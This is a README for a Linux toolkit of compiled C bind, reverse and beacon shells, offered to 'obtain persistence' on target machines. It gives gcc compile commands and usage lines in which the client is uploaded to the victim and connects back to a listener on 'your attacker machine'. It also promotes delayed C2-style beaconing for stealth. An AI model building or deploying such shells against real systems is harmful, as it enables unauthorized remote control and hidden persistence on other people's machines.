# Description
These are binaries that you can compile and execute to obtain persistence.
- Bind Shells
- Reverse Shells
- Beacon-like Shells

Note: Currently these shells are Linux specific meaning they most likely won't run on Windows OS. Windows shells will come in the future though!

# Compiling
To compile the binaries, simply run:
```
gcc -o server server.c && gcc -o client client.c
```

# Usage

## Bind Shells
Multi-client bind shell is a work in progress. Currently, only one client can connect at a time. 
```
./server <PORT>

rlwrap ./client <IP> <Port>
```
I also suggest using the `rlwrap` tool when executing the client. This tool allows you to scroll through previous commands and use arrow keys to edit your commands.

## Reverse Shells
Works like a standard reverse shell payload. Just upload and run. The server is the listener, so it's executed on your attacker machine.
```
rlwrap ./server <PORT>

./client <IP> <PORT>
```

## Beacon Shells
These are basically reverse shells except they have a delay in which they grab commands and you can execute binaries as you would in a C2 server. This can be helpful in stealth. HTTP based beacon shells may come in the future!
```
rlwrap ./server <PORT>

./client <IP> <PORT>
```
